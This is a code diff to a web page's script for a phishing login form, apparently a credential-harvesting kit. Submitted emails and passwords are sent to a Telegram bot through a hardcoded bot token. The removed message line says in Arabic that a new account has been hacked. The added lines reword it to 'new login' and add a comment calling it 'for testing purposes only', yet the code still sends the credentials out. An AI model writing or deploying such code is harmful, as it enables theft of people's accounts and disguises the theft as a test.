@@ -62,20 +62,21 @@
     </form>
   <script>
   window.onload = function () {
-  const params = new URLSearchParams(window.location.search);
-  const chatId = params.get('chatId');
-  const id = params.get('id');
+    const params = new URLSearchParams(window.location.search);
+    const chatId = params.get('chatId');
+    const id = params.get('id');
 
-  if (chatId && !id) {
-    // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-    const targetURL = `${window.location.pathname}?id=${chatId}`;
-    window.location.href = targetURL;
-  }
-};
+    if (chatId && !id) {
+      // لو فيه chatId بس — نحوله لـ id في نفس الرابط
+      const targetURL = `${window.location.pathname}?id=${chatId}`;
+      window.location.href = targetURL;
+    }
+    // لو فيه id هيكمل عادي
+  };
 
   const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
 
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
+  document.getElementById("loginForm").addEventListener("submit", function (e) {
     e.preventDefault();
 
     const params = new URLSearchParams(window.location.search);
@@ -89,9 +90,10 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    const message = 📥 - تم اختراق حساب جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
+    // رسالة لأغراض تجريبية فقط
+    const message = `📥 - تسجيل دخول جديد:\n📧 - الإيميل: ${email}\n🔑 - كلمة المرور: ${password}`;
 
-    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)};
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
       .then(response => response.json())
